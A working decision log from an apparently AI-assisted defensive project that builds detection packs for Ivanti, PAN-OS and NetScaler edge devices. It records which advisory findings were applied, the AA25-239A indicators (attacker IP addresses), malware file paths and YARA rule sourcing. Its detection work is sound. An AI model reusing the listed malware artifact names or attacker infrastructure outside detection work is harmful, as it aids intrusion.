| A12 (part) md_out.log and device_telemetry_send.log | "consider" only and not re-read; not added. |
| B8 (part) find for *.deb under the VPN scripts directory | Not applied: Unit 42 gives a URL path (/vpn/scripts/linux/...); its on-disk location is not published. Recorded as a gap in netscaler-var-tmp-staging notes. |
| B11 (option) carry the remaining NCSC-NL checks | Took the other option the finding allows: removed the "already covered" claim and listed the uncovered checks as gaps. |
| B14 (option) vendor syslogAction/syslogPolicy commands | Not applied: syntax not read from a vendor page in this pass; the control states the guide gives none. |
| B20 (part) off-box web-log detection for welcome.cgi + X-DSCGI-PATH | Not applied: needs a proxy log with request headers and no published field format; stated as uncovered in the pack and actor notes. |
| B24 (part) log_regex for SYS32039/SYS32040; statedump/core artifacts | Event IDs recorded in catalog and profile; no detection added (PACK-0007 is scoped to web logs) and the GTIG statedump/core items were not re-read. Follow-up. |
| B37 (part) add SPAWNWAVE/SPAWNSNARE | Optional ("if desired"); not added. |
| F18 (policy) whether government directives count as "documented" for high | Not decided here; the four single-source controls were set to medium. Main session to settle in CLAUDE.md. **Settled 2026-10-27** (below). |
| F23 (part) RayDetect claim | Finding says it was not verified; left unchanged. |

#### Follow-ups for the main session

- AA25-239A STIX bundle (https://www.cisa.gov/sites/default/files/2025-09/AA25-239A_Countering_Chinese_State-Sponsored_Actors_Compromise_of_Networks_Worldwide_to_Feed_Global_Espionage_System.stix_.json) is reachable; no IOC set added in this pass. EDGE-TA-0007 cites it.
- CLAUDE.md "Attribute the action to the right actor" says the 2025 Ivanti syslog block was "the operator's iptables command"; GTIG says "the exploit and script". Rewrite to "UNC5221's exploit script, not SPAWN malware".
- NOTICE: 01-panos-globalprotect/panos_upstyle_backdoor.yar now carries Volexity's apt_malware_py_upstyle strings and condition (credited, licence linked); add a NOTICE line for Volexity threat-intel if the project lists third-party rule content there.
- UTA0178 has no profile of its own; Volexity's UTA0178 IOC set and the 2024 web shells stay linked to EDGE-TA-0002 with a note. A separate EDGE-TA profile for UTA0178 (Volexity) would match the "never merge" rule more cleanly.
- EDGE-TA-0007 still lists Salt Typhoon, OPERATOR PANDA, RedMike, UNC5807 and GhostEmperor as aliases on the strength of "partially overlaps"; not in these findings, but the same rule applies.
- tests/test_site.py: no hunt quote is read: summariser any more, so the drawer flag is no longer exercised by real data (assertion flipped for EDGE-HUNT-0010).

## 2026-10-27 - indicators, advisory sweep and the government-source rule

### AA25-239A indicators (EDGE-IOC-0013)
CISA's STIX bundle returns 403 to the workspace, so the set is parsed from the
joint advisory PDF as published by IC3 (`https://www.ic3.gov/CSA/2025/250827.pdf`,
sha256 `1d0619d9…5e40`, identical on 2026-10-22 and 2026-10-27). Table cells wrap
in the PDF, so values were joined by page geometry and each joined value checked
against CISA's HTML rendering of the same table.

| Item | Finding | Decision | Basis |
|---|---|---|---|
| Two wrapped IPv6 cells | Joined to `2001:41d0:700:65dc::f656:929f` and `2a10:1fc0:7::f19c:39b3` | Loaded | CISA HTML Table 3 prints both whole |
| Four wrapped SHA-256 cells (cmd3, cmd1, new2, sft) | Joined to 64 hex characters each | Loaded | CISA HTML Tables 4-7 print the same values |
| `146.70.79.78`, `193.56.255.209`, `45.61.134.22` | Printed in the PDF (stamped Ver. 1.1) but absent from CISA's live Table 3 | Left out | CISA version history: "3 September 2025, v1.1: ... one IP correction and two removals"; the HTML is the current text |
| Roles | The advisory calls the addresses "APT-associated" and never says which the actors own | `unknown` for every address; `actor-controlled` for the SFTP client hashes ("The APT actors also use a custom SFTP client") | Indicators rule in CLAUDE.md |

### Advisory sweep since round 3 (KEV 2026.10.21 to 2026.10.26)

| Item | Finding | Decision | Basis |
|---|---|---|---|
| KEV additions 2026-10-21 to 2026-10-26 | Four entries (PHP x2, Arista VeloCloud, Collabora) | None on a watched platform | KEV catalog 2026.10.26 |
| CVE-2026-0322 (PAN-OS management interface RCE, KEV 2026-10-14) | Not in any pack; vendor publishes three addresses and no host indicator | EDGE-IOC-0012; added to `panos-mgmt-trusted-ips` blunts | Palo Alto Networks: "the following IP addresses have been associated with threat activity and limited exploit attempts targeting this vulnerability"; "The security risk posed by this issue is minimized by restricting access to the management interface to only trusted internal IP addresses" |
| CVE-2026-0257 ransomware reporting (Help Net Security, 2026-10-21) | Press summary of Unit 42's 19 October update naming Qilin and Inc | No change: EDGE-PACK-0025 already cites the Unit 42 brief with both names | Unit 42 threat brief (already referenced) |
| ReliaQuest note on GlobalProtect sessions with host names such as "kali" | Seen only through a press summary | Not added; follow-up against ReliaQuest's own post | Help Net Security (secondary) |
| Ivanti CVE-2026-104935, Juniper AV26-1043, Cisco IOS XE August advisories | Already covered (EDGE-PACK-0026) / no exploitation stated / no exploitation stated | No change | CCCS AV26-1043; Cisco via ThreatCluster: "No active exploitation" |
| 22 older KEV entries on watched platforms with no pack | Never triaged one by one | Recorded as `deferred` in `artifacts/watch/kev-watch.yml` | Ledger rule in CLAUDE.md |

### Government guidance counts as documentation (F18 settled)
A government cyber authority's own publication documents what that authority
recommends; CLAUDE.md's confidence rule now says so. Re-read on the live pages
before restoring:

| Item | Was | Now | Basis |
|---|---|---|---|
| base-separate-pep | medium | high | CISA BOD 23-02 implementation guidance: "The policy enforcement should be separate from the device itself" |
| base-segregate-from-ad | medium, one quote | high, PAM quote added | ASD: "Edge devices that use local accounts should be managed through a Privileged Access Management (PAM) system or secrets manager." |
| base-default-creds | medium; "prefer products that make you create one" and "note it in procurement" unsourced | high; unsourced parts removed | ASD and CCCS quotes already on the control |
| base-procure-forensics | medium; "make the specification a procurement requirement", no quote | high; NCSC's softer wording | NCSC-UK: "Network defenders are encouraged to consider these features when selecting new physical and virtual network devices." |

The other seven baseline controls stay medium; they were not re-scored under
the new rule in this pass.

## 2026-10-27 - Ivanti CVE-2025-0282 and CVE-2025-22457 (EDGE-PACK-0029)

Read on the live pages: both GTIG posts (saved copies, parsed in code), Ivanti's two
advisories and KB44859 (Firecrawl).

| Item | Decision | Basis |
|---|---|---|
| Mandiant YARA rules (7) | Copied in code from the posts' code blocks; wrapped meta descriptions joined; compile | GTIG January and April 2025 posts |
| /tmp dropper and tooling files | path_exists, likely | GTIG: "/tmp/.liblogblock.so", "/tmp/s", "/tmp/svb", "LDAP queries were executed using /tmp/lmdbcerr", "/tmp/cmdmmap.kuwMW", "/tmp/.p ... /tmp/.i" |
| PHASEJAM .bak copies | path_exists, likely | GTIG: "PHASEJAM renames the file /home/bin/remotedebug to remotedebug.bak"; printed cp commands for getComponent.cgi, restAuth.cgi, DSUpgrade.pm |
| SPAWN library names | path_exists, possible | GTIG lists the names; it does not say a clean appliance lacks them |
| `/bin/dsmain` (SPAWNSNARE) | Left out of the name check | Same reason; YARA rule and MD5 cover it |
| SYS32039 / SYS32040 | log_regex, possible | KB44859: "id=' SYS32040' - Integrity Checker Failed: Detected 1 mismatched files!"; Ivanti publishes false-positive guidance for the external scan |
| EDGE-IOC-0014 | 5 MD5 from GTIG's April table + 4 from rule md5 fields | GTIG keeps the rest in a GTI Collection "for registered users" |
| Ledger | CVE-2025-0282 and CVE-2025-22457 removed (now in a pack) | - |

## Device verification

| Date | Platform / release | Step | Change | Basis |
|---|---|---|---|---|
| - | - | - | No real-device runs yet. | - |
